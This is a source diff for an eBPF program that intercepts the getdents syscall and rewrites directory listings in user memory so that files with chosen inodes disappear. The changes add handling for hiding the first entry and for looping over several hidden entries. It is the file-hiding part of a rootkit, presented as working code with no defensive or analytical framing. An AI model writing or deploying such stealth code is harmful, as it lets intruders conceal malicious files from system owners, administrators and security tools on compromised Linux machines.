@@ -7,6 +7,10 @@
 
 #define ENOENT 2
 
+static void hide_first_entry(long unsigned int buff_addr,
+    struct linux_dirent64 * dirp,
+    unsigned short d_reclen);
+
 char _license[] SEC("license") = "GPL";
 
 // Ringbuffer Map to pass messages from kernel to user
@@ -124,15 +128,26 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit * ctx) {
                 break;
 
             if (inodes_to_hide[i] == inode) {
+                if (bpos == 0) { // First entry
+                    if (total_bytes_read == d_reclen) { // only one entry
+                        break;
+                    }
+                    hide_first_entry(buff_addr, dirp, d_reclen);
+                    break;
+                }
+
                 // Go to the handle_getdents_patch function
-                bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
-                bpf_map_delete_elem(&map_buffs, &pid_tgid);
+                // bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
+                // bpf_map_delete_elem(&map_buffs, &pid_tgid);
+                bpos += d_reclen;
+                bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
                 bpf_tail_call(ctx, &prog_array, PROG_02);
                 break;
             }
         }
 
         // Move to next entry
+        bpf_printk("moving to next entry, current inode: %d\n", inode);
         bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
         bpos += d_reclen;
     }
@@ -146,6 +161,55 @@ int handle_getdents_exit(struct trace_event_raw_sys_exit * ctx) {
     bpf_map_delete_elem(&map_buffs, &pid_tgid);
 
     return 0;
+}
+
+static void hide_first_entry(long unsigned int buff_addr, struct linux_dirent64 * dirp, unsigned short d_reclen) {
+    // To hide the first entry, we have to move second entry to
+    // its place, and set its size (d_reclen) to the sum of
+    // first entry (the one we hidding) and its next entry
+
+    // Reason why we manually copy each field from dirp_next to
+    // drip, is becuase ebpf won't allow to copy dirp directly
+
+    // Copy second buffer to first one
+    struct linux_dirent64 * dirp_next = (struct linux_dirent64 *)(buff_addr + d_reclen);
+
+    // Copy dirp_next to the current dirp field by field
+    u64 tmp_inode, tmp_d_off;
+    unsigned short tmp_reclean, next_reclean;
+    unsigned short tmp_type;
+    // Read all fields (except d_name)
+    bpf_probe_read_user(&tmp_inode, sizeof(tmp_inode), &dirp_next->d_ino);
+    bpf_probe_read_user(&tmp_d_off, sizeof(tmp_d_off), &dirp_next->d_off);
+    bpf_probe_read_user(&tmp_reclean, sizeof(tmp_reclean), &dirp_next->d_reclen);
+    bpf_probe_read_user(&tmp_type, sizeof(tmp_type), &dirp_next->d_type);
+
+    // Copy next dirent reclean for later use
+    next_reclean = tmp_reclean;
+    // Increase size of reclean to sum of first and second dirents
+    // This is part of hiding mechanism
+    tmp_reclean += d_reclen;
+
+    // Rewrite all fields (except d_name)
+    bpf_probe_write_user(&dirp->d_ino, &tmp_inode, sizeof(tmp_inode));
+    bpf_probe_write_user(&dirp->d_off, &tmp_d_off, sizeof(tmp_d_off));
+    bpf_probe_write_user(&dirp->d_reclen, &tmp_reclean, sizeof(tmp_reclean));
+    bpf_probe_write_user(&dirp->d_type, &tmp_type, sizeof(tmp_type));
+
+    // Actual d_name size of dirp_next
+    size_t name_size =  next_reclean - 2 - offsetof(struct linux_dirent, d_name);
+
+    // Read d_name
+    char tmp_filename[MAX_FILENAME_LEN];
+    bpf_probe_read_user(&tmp_filename, sizeof(tmp_filename), &dirp_next->d_name);
+
+    // Rewrite d_name
+    // Copy filename byte by byte, because ebpf won't allow to copy it once
+    for (size_t j = 0; j < 32; j++) {
+        if (j == name_size + 1)
+            break;
+        bpf_probe_write_user(&dirp->d_name[j], &tmp_filename[j], sizeof(char));
+    }
 }
 
 SEC("tp/unused")
@@ -195,6 +259,9 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit * ctx) {
     long ret = bpf_probe_write_user(&dirp_prev->d_reclen, &reclen_new, sizeof(reclen_new));
 
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
+
+    // Go back to the original call, to check if there is more to hide
+    bpf_tail_call(ctx, &prog_array, PROG_01);
     return 0;
 }
 
